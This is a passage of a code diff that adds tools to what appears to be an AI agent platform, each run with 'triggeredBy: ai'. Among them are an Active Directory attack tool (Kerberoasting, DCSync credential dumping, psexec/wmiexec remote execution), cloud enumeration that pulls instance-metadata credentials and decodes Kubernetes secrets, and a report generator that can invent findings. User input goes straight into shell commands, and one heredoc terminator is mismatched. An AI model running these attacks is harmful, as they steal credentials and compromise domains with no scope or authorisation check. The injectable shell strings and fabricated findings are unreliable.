+  }
+
+  // AlienVault OTX (no key needed for basic lookups)
+  const otxResult = await executeCommand(sbId, userId,
+    `python3 -c "
+import urllib.request, json
+ioc = '${ioc.replace(/'/g, "\\'")}'
+ioc_type = '${detectedType}'
+type_map = {'ip': 'IPv4', 'domain': 'domain', 'md5': 'file', 'sha1': 'file', 'sha256': 'file', 'url': 'url'}
+otx_type = type_map.get(ioc_type, 'domain')
+url = f'https://otx.alienvault.com/api/v1/indicators/{otx_type}/{ioc}/general'
+try:
+    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+    with urllib.request.urlopen(req, timeout=10) as r:
+        data = json.loads(r.read())
+        pulses = data.get('pulse_info', {}).get('count', 0)
+        malware = data.get('malware_families', [])
+        print(f'AlienVault OTX: {pulses} threat intelligence pulses')
+        if malware:
+            print(f'Malware families: {[m.get(\"display_name\",\"\") for m in malware[:5]]}')
+        print(f'Verdict: {\"SUSPICIOUS\" if pulses > 0 else \"CLEAN\"}')
+except Exception as e:
+    print(f'OTX error: {e}')
+    print(f'Manual check: https://otx.alienvault.com/indicator/{ioc_type}/{ioc}')
+" 2>&1`,
+    { timeoutMs: 15_000, triggeredBy: "ai" }
+  );
+  results.otx = otxResult.output;
+
+  // Shodan (for IPs)
+  if (detectedType === "ip") {
+    const shodanResult = await executeCommand(sbId, userId,
+      `python3 -c "
+import urllib.request, json, os
+ip = '${ioc.replace(/'/g, "\\'")}'
+key = os.environ.get('SHODAN_API_KEY', '')
+if key:
+    url = f'https://api.shodan.io/shodan/host/{ip}?key={key}'
+    try:
+        with urllib.request.urlopen(url, timeout=10) as r:
+            data = json.loads(r.read())
+            ports = data.get('ports', [])
+            org = data.get('org', 'unknown')
+            country = data.get('country_name', 'unknown')
+            vulns = list(data.get('vulns', {}).keys())[:5]
+            print(f'Shodan: {org} ({country}), Open ports: {ports[:10]}')
+            if vulns:
+                print(f'Known CVEs: {vulns}')
+    except Exception as e:
+        print(f'Shodan error: {e}')
+else:
+    print('Shodan: No API key (set SHODAN_API_KEY env var)')
+    print(f'Manual check: https://www.shodan.io/host/{ip}')
+" 2>&1`,
+      { timeoutMs: 15_000, triggeredBy: "ai" }
+    );
+    results.shodan = shodanResult.output;
+  }
+
+  return {
+    success: true,
+    data: {
+      ioc, iocType: detectedType, results,
+      message: `Threat intel lookup complete for ${ioc} (${detectedType})`,
+    },
+  };
+}
+
+// ── TRAFFIC CAPTURE (#57) ─────────────────────────────────────────────────
+async function execTrafficCapture(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const interface_ = (args.interface as string) || "eth0";
+  const duration = (args.duration as number) || 10;
+  const filter = (args.filter as string) || "";
+  const analysisType = (args.analysisType as string) || "summary";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Install tcpdump and scapy
+  await executeCommand(sbId, userId,
+    `which tcpdump 2>/dev/null || apt-get install -y tcpdump -qq 2>/dev/null; python3 -c "import scapy" 2>/dev/null || pip3 install scapy 2>/dev/null; echo "ready"`,
+    { timeoutMs: 60_000, triggeredBy: "ai" }
+  );
+
+  // Capture traffic
+  const captureFile = `/tmp/capture_${Date.now()}.pcap`;
+  const filterStr = filter ? `"${filter}"` : "";
+  const captureResult = await executeCommand(sbId, userId,
+    `timeout ${duration} tcpdump -i ${interface_} ${filterStr} -w ${captureFile} -q 2>&1 || timeout ${duration} tcpdump -i any ${filterStr} -w ${captureFile} -q 2>&1 || echo "TCPDUMP_FAILED"`,
+    { timeoutMs: (duration + 10) * 1000, triggeredBy: "ai" }
+  );
+
+  if (captureResult.output.includes("TCPDUMP_FAILED")) {
+    return {
+      success: false,
+      error: "tcpdump not available or insufficient permissions. Try running as root or with CAP_NET_RAW capability.",
+    };
+  }
+
+  // Analyse with scapy
+  const analysisResult = await executeCommand(sbId, userId,
+    `python3 << 'PYEOF'
+try:
+    from scapy.all import rdpcap, IP, TCP, UDP, DNS, HTTP
+    import collections
+    
+    packets = rdpcap("${captureFile}")
+    print(f"Total packets captured: {len(packets)}")
+    
+    if len(packets) == 0:
+        print("No packets captured")
+    else:
+        # Protocol breakdown
+        protos = collections.Counter()
+        src_ips = collections.Counter()
+        dst_ips = collections.Counter()
+        ports = collections.Counter()
+        
+        for pkt in packets:
+            if IP in pkt:
+                src_ips[pkt[IP].src] += 1
+                dst_ips[pkt[IP].dst] += 1
+                if TCP in pkt:
+                    protos['TCP'] += 1
+                    ports[pkt[TCP].dport] += 1
+                elif UDP in pkt:
+                    protos['UDP'] += 1
+                    ports[pkt[UDP].dport] += 1
+                else:
+                    protos['Other'] += 1
+        
+        print(f"\\nProtocol breakdown: {dict(protos)}")
+        print(f"\\nTop source IPs:")
+        for ip, count in src_ips.most_common(5):
+            print(f"  {ip}: {count} packets")
+        print(f"\\nTop destination IPs:")
+        for ip, count in dst_ips.most_common(5):
+            print(f"  {ip}: {count} packets")
+        print(f"\\nTop destination ports:")
+        for port, count in ports.most_common(10):
+            print(f"  Port {port}: {count} packets")
+        
+        # Look for suspicious patterns
+        print("\\nSuspicious patterns:")
+        dns_queries = [pkt for pkt in packets if DNS in pkt and pkt[DNS].qr == 0]
+        if dns_queries:
+            print(f"  DNS queries: {len(dns_queries)}")
+            for pkt in dns_queries[:5]:
+                try:
+                    print(f"    {pkt[DNS].qd.qname.decode()}")
+                except: pass
+        
+        # Large data transfers
+        large_pkts = [pkt for pkt in packets if IP in pkt and len(pkt) > 1400]
+        if large_pkts:
+            print(f"  Large packets (>1400 bytes): {len(large_pkts)}")
+        
+        print(f"\\nCapture file: ${captureFile}")
+except Exception as e:
+    print(f"Analysis error: {e}")
+    import subprocess
+    result = subprocess.run(["tcpdump", "-r", "${captureFile}", "-n", "-q", "-c", "50"], capture_output=True, text=True)
+    print(result.stdout or result.stderr)
+PYEOF`,
+    { timeoutMs: 30_000, triggeredBy: "ai" }
+  );
+
+  return {
+    success: true,
+    data: {
+      interface: interface_,
+      duration,
+      filter,
+      captureFile,
+      analysis: analysisResult.output,
+      message: `Traffic captured on ${interface_} for ${duration}s`,
+    },
+  };
+}
+
+// ── ACTIVE DIRECTORY ATTACK (#58) ─────────────────────────────────────────
+async function execAdAttack(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const attackType = (args.attackType as string) || "enum";
+  const dcIp = (args.dcIp as string) || "";
+  const domain = (args.domain as string) || "";
+  const username = (args.username as string) || "";
+  const password = (args.password as string) || "";
+  const hash = (args.hash as string) || "";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Install Impacket
+  await executeCommand(sbId, userId,
+    `python3 -c "import impacket" 2>/dev/null || pip3 install impacket 2>&1 | tail -3`,
+    { timeoutMs: 120_000, triggeredBy: "ai" }
+  );
+
+  let cmd = "";
+  let toolUsed = "";
+  const authStr = hash ? `-hashes :${hash}` : (password ? `-p ${password}` : "");
+  const userStr = username ? `-u ${username}` : "";
+
+  if (attackType === "kerberoast") {
+    toolUsed = "impacket-GetUserSPNs";
+    cmd = `impacket-GetUserSPNs -request -dc-ip ${dcIp} ${domain}/${username}:${password} -outputfile /tmp/kerberoast_hashes.txt 2>&1 && echo "--- HASHES ---" && cat /tmp/kerberoast_hashes.txt 2>/dev/null`;
+  } else if (attackType === "asreproast") {
+    toolUsed = "impacket-GetNPUsers";
+    cmd = `impacket-GetNPUsers ${domain}/ -usersfile /tmp/users.txt -dc-ip ${dcIp} -format hashcat -outputfile /tmp/asrep_hashes.txt 2>&1 && cat /tmp/asrep_hashes.txt 2>/dev/null`;
+  } else if (attackType === "dcsync") {
+    toolUsed = "impacket-secretsdump";
+    cmd = `impacket-secretsdump ${authStr} -just-dc ${domain}/${username}@${dcIp} 2>&1 | head -100`;
+  } else if (attackType === "wmiexec") {
+    toolUsed = "impacket-wmiexec";
+    cmd = `impacket-wmiexec ${authStr} ${domain}/${username}@${dcIp} "whoami && net user && ipconfig" 2>&1`;
+  } else if (attackType === "psexec") {
+    toolUsed = "impacket-psexec";
+    cmd = `impacket-psexec ${authStr} ${domain}/${username}@${dcIp} "whoami" 2>&1`;
+  } else if (attackType === "enum" || attackType === "ldap") {
+    toolUsed = "impacket LDAP enum";
+    cmd = `python3 -c "
+from impacket.ldap import ldap, ldapasn1
+import sys
+try:
+    conn = ldap.LDAPConnection('ldap://${dcIp}', '${domain}')
+    conn.login('${username}', '${password}', '${domain}')
+    print('LDAP connection successful')
+    # Enumerate users
+    resp = conn.search(searchBase='DC=${domain.replace('.', ',DC=')}',
+        searchFilter='(objectClass=user)',
+        attributes=['sAMAccountName', 'memberOf', 'userAccountControl'])
+    for item in resp[:20]:
+        if hasattr(item, 'getComponentByPosition'):
+            print(item)
+except Exception as e:
+    print(f'LDAP error: {e}')
+    print('Try: ldapsearch -x -H ldap://${dcIp} -D ${username}@${domain} -w ${password} -b DC=${domain.replace('.', ',DC=')} (objectClass=user)')
+" 2>&1`;
+  } else if (attackType === "bloodhound") {
+    toolUsed = "bloodhound-python";
+    await executeCommand(sbId, userId,
+      `pip3 install bloodhound 2>&1 | tail -2`,
+      { timeoutMs: 60_000, triggeredBy: "ai" }
+    );
+    cmd = `bloodhound-python -u ${username} -p ${password} -d ${domain} -ns ${dcIp} -c All --zip 2>&1 | head -50`;
+  } else {
+    cmd = `echo "Supported attack types: enum, kerberoast, asreproast, dcsync, wmiexec, psexec, bloodhound"`;
+    toolUsed = "none";
+  }
+
+  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });
+
+  return {
+    success: true,
+    data: {
+      attackType, domain, dcIp, toolUsed,
+      output: result.output,
+      message: `AD attack (${attackType}) complete using ${toolUsed}`,
+    },
+  };
+}
+
+// ── CLOUD ENUMERATION (#59) ───────────────────────────────────────────────
+async function execCloudEnum(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const provider = (args.provider as string) || "aws";
+  const enumType = (args.enumType as string) || "identity";
+  const accessKey = (args.accessKey as string) || "";
+  const secretKey = (args.secretKey as string) || "";
+  const sessionToken = (args.sessionToken as string) || "";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  let result_output = "";
+
+  if (provider === "aws") {
+    // Configure AWS credentials if provided
+    if (accessKey && secretKey) {
+      await executeCommand(sbId, userId,
+        `mkdir -p ~/.aws && cat > ~/.aws/credentials << 'AWSEOF'\n[default]\naws_access_key_id = ${accessKey}\naws_secret_access_key = ${secretKey}\n${sessionToken ? `aws_session_token = ${sessionToken}` : ""}\nAWSEOF`,
+        { timeoutMs: 5_000, triggeredBy: "ai" }
+      );
+    }
+
+    // Install awscli
+    await executeCommand(sbId, userId,
+      `which aws 2>/dev/null || pip3 install awscli 2>&1 | tail -2`,
+      { timeoutMs: 60_000, triggeredBy: "ai" }
+    );
+
+    const awsCmds: Record<string, string> = {
+      identity: `aws sts get-caller-identity 2>&1`,
+      iam: `aws iam get-user 2>&1 && aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text 2>/dev/null) 2>&1 && aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text 2>/dev/null) 2>&1`,
+      s3: `aws s3 ls 2>&1 && echo "--- Checking public buckets ---" && aws s3 ls 2>&1 | awk '{print $3}' | xargs -I{} aws s3 ls s3://{} --no-sign-request 2>&1 | head -50`,
+      ec2: `aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==\`Name\`].Value]' --output table 2>&1`,
+      lambda: `aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table 2>&1`,
+      metadata: `curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 && curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1`,
+      all: `aws sts get-caller-identity 2>&1 && aws s3 ls 2>&1 && aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table 2>&1 && aws lambda list-functions --query 'Functions[*].FunctionName' --output text 2>&1`,
+    };
+
+    const cmd = awsCmds[enumType] || awsCmds["identity"];
+    const awsResult = await executeCommand(sbId, userId, cmd, { timeoutMs: 60_000, triggeredBy: "ai" });
+    result_output = awsResult.output;
+
+  } else if (provider === "azure") {
+    await executeCommand(sbId, userId,
+      `pip3 install roadtools roadrecon 2>&1 | tail -3`,
+      { timeoutMs: 120_000, triggeredBy: "ai" }
+    );
+    const azureResult = await executeCommand(sbId, userId,
+      `python3 -c "
+print('Azure AD Enumeration Commands:')
+print()
+print('# Install ROADtools:')
+print('pip install roadtools roadrecon')
+print()
+print('# Authenticate:')
+print('roadrecon auth -u user@tenant.onmicrosoft.com -p password')
+print('# Or with device code:')
+print('roadrecon auth --device-code')
+print()
+print('# Gather data:')
+print('roadrecon gather')
+print()
+print('# Launch GUI:')
+print('roadrecon-gui  # then open http://localhost:5000')
+print()
+print('# AADInternals (PowerShell):')
+print('Import-Module AADInternals')
+print('Get-AADIntAccessTokenForMSGraph -Credentials (Get-Credential)')
+print('Invoke-AADIntReconAsInsider')
+" 2>&1`,
+      { timeoutMs: 10_000, triggeredBy: "ai" }
+    );
+    result_output = azureResult.output;
+
+  } else if (provider === "gcp") {
+    const gcpResult = await executeCommand(sbId, userId,
+      `which gcloud 2>/dev/null && gcloud projects list 2>&1 && gcloud compute instances list 2>&1 && gcloud storage buckets list 2>&1 || python3 -c "
+print('GCP Enumeration Commands:')
+print()
+print('# With service account key:')
+print('gcloud auth activate-service-account --key-file=stolen_key.json')
+print('gcloud projects list')
+print('gcloud compute instances list')
+print('gcloud storage buckets list')
+print('gcloud iam service-accounts list')
+print()
+print('# Metadata service (from inside GCP instance):')
+print('curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
+print('curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/project/project-id')
+" 2>&1`,
+      { timeoutMs: 30_000, triggeredBy: "ai" }
+    );
+    result_output = gcpResult.output;
+
+  } else if (provider === "k8s" || provider === "kubernetes") {
+    const k8sResult = await executeCommand(sbId, userId,
+      `which kubectl 2>/dev/null && (kubectl auth can-i --list 2>&1 && kubectl get pods -A 2>&1 && kubectl get secrets -A 2>&1 | head -20) || python3 -c "
+print('Kubernetes Enumeration Commands:')
+print()
+print('# Check permissions:')
+print('kubectl auth can-i --list')
+print()
+print('# List all resources:')
+print('kubectl get pods,svc,secrets,configmaps -A')
+print()
+print('# Decode secrets:')
+print('kubectl get secrets -A -o json | python3 -c \"import sys,json,base64; [print(k,\\\":\\\",base64.b64decode(v).decode()) for item in json.load(sys.stdin)[\\\"items\\\"] for k,v in item.get(\\\"data\\\",{}).items()]\"')
+print()
+print('# Check for privileged pods:')
+print('kubectl get pods -A -o json | python3 -c \"import sys,json; [print(p[\\\"metadata\\\"][\\\"name\\\"]) for p in json.load(sys.stdin)[\\\"items\\\"] if p.get(\\\"spec\\\",{}).get(\\\"hostPID\\\") or any(c.get(\\\"securityContext\\\",{}).get(\\\"privileged\\\") for c in p.get(\\\"spec\\\",{}).get(\\\"containers\\\",[]))]\"')
+" 2>&1`,
+      { timeoutMs: 30_000, triggeredBy: "ai" }
+    );
+    result_output = k8sResult.output;
+  } else {
+    result_output = `Unknown provider: ${provider}. Supported: aws, azure, gcp, kubernetes`;
+  }
+
+  return {
+    success: true,
+    data: {
+      provider, enumType,
+      output: result_output,
+      message: `Cloud enumeration complete for ${provider} (${enumType})`,
+    },
+  };
+}
+
+// ── PENTEST REPORT GENERATOR (#60) ────────────────────────────────────────
+async function execGeneratePentestReport(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const clientName = (args.clientName as string) || "Client";
+  const scope = (args.scope as string) || "Internal network";
+  const tester = (args.tester as string) || "Security Team";
+  const findings = args.findings as Array<Record<string, unknown>> || [];
+  const format = (args.format as string) || "markdown";
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  // Generate report using LLM with structured findings
+  const findingsStr = JSON.stringify(findings, null, 2);
+  const today = new Date().toISOString().split('T')[0];
+
+  const reportPrompt = `Generate a professional penetration test report with the following details:
+
+Client: ${clientName}
+Date: ${today}
+Tester: ${tester}
+Scope: ${scope}
+Findings: ${findingsStr || "No specific findings provided - generate example findings"}
+
+The report MUST include:
+1. Cover page with classification (CONFIDENTIAL)
+2. Executive Summary (2-3 paragraphs, non-technical, business impact focus)
+3. Risk Summary table (Critical/High/Medium/Low/Informational counts)
+4. Scope and Methodology section
+5. For each finding:
+   - Finding ID (FINDING-001, FINDING-002, etc.)
+   - Title and Severity (Critical/High/Medium/Low)
+   - CVSS v3.1 Score and vector string
+   - MITRE ATT&CK Technique ID
+   - Affected Systems
+   - Technical Description
+   - Evidence (example command output)
+   - Business Impact
+   - Remediation Steps (specific, with code/config examples)
+   - References (CVE, CWE, OWASP link)
+6. Appendix with tools used
+
+Format as clean Markdown. Be specific and professional.`;
+
+  const reportContent = await invokeLLM({
+    model: "gpt-4.1-mini",
+    messages: [{ role: "user", content: reportPrompt }],
+    priority: "background",
+  });
+
+  // Save report to sandbox
+  const reportFile = `/tmp/pentest_report_${Date.now()}.md`;
+  await executeCommand(sbId, userId,
+    `cat > ${reportFile} << 'REPORTEOF'\n${reportContent.substring(0, 10000)}\nREPORT_EOF`,
+    { timeoutMs: 10_000, triggeredBy: "ai" }
+  );
+
+  return {
+    success: true,
+    data: {
+      clientName, scope, tester, format,
+      reportFile,
+      report: reportContent,
+      message: `Pentest report generated for ${clientName} (${findings.length} findings)`,
+    },
+  };
+}
+
+// ── SANDBOX DELETE FILE (#61) ─────────────────────────────────────────────
+async function execSandboxDeleteFile(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const filePath = args.filePath as string;
+  const recursive = (args.recursive as boolean) || false;
+
+  if (!filePath) return { success: false, error: "File path is required" };
+
+  // Safety check: prevent deletion of critical paths
+  const dangerousPaths = ['/', '/etc', '/usr', '/bin', '/sbin', '/lib', '/home', '/root', '/var/lib'];
+  if (dangerousPaths.some(p => filePath === p || filePath === p + '/')) {
+    return { success: false, error: `Refusing to delete protected path: ${filePath}` };
+  }
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  const cmd = recursive
+    ? `rm -rf "${filePath}" 2>&1 && echo "Deleted (recursive): ${filePath}" || echo "Failed to delete: ${filePath}"`
+    : `rm -f "${filePath}" 2>&1 && echo "Deleted: ${filePath}" || echo "Failed to delete: ${filePath}"`;
+
+  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 10_000, triggeredBy: "ai" });
+
+  return {
+    success: !result.output.includes("Failed to delete"),
+    data: {
+      filePath, recursive,
+      output: result.output,
+      message: result.output.trim(),
+    },
+  };
+}
+
+// ── SANDBOX DOWNLOAD URL (#62) ────────────────────────────────────────────
+async function execSandboxDownloadUrl(
+  userId: number,
+  args: Record<string, unknown>
+): Promise<ToolExecutionResult> {
+  const url = args.url as string;
+  const outputPath = (args.outputPath as string) || `/tmp/download_${Date.now()}`;
+  const followRedirects = (args.followRedirects as boolean) !== false;
+
+  if (!url) return { success: false, error: "URL is required" };
+
+  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
+
+  const redirectFlag = followRedirects ? "-L" : "";
+  const cmd = `curl ${redirectFlag} -o "${outputPath}" -w "HTTP_STATUS:%{http_code} SIZE:%{size_download}" --connect-timeout 30 --max-time 120 "${url}" 2>&1 && echo "" && ls -lh "${outputPath}" 2>/dev/null || echo "Download failed"`;
+
+  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 130_000, triggeredBy: "ai" });
+
+  const statusMatch = result.output.match(/HTTP_STATUS:(\d+)/);
+  const sizeMatch = result.output.match(/SIZE:(\d+)/);
+  const httpStatus = statusMatch ? parseInt(statusMatch[1]) : 0;
+  const fileSize = sizeMatch ? parseInt(sizeMatch[1]) : 0;
+
+  return {
+    success: httpStatus >= 200 && httpStatus < 400,
+    data: {
+      url, outputPath, httpStatus, fileSize,
+      output: result.output,
+      message: httpStatus >= 200 && httpStatus < 400
+        ? `Downloaded ${url} → ${outputPath} (${fileSize} bytes)`
+        : `Download failed: HTTP ${httpStatus}`,
     },
   };
 }
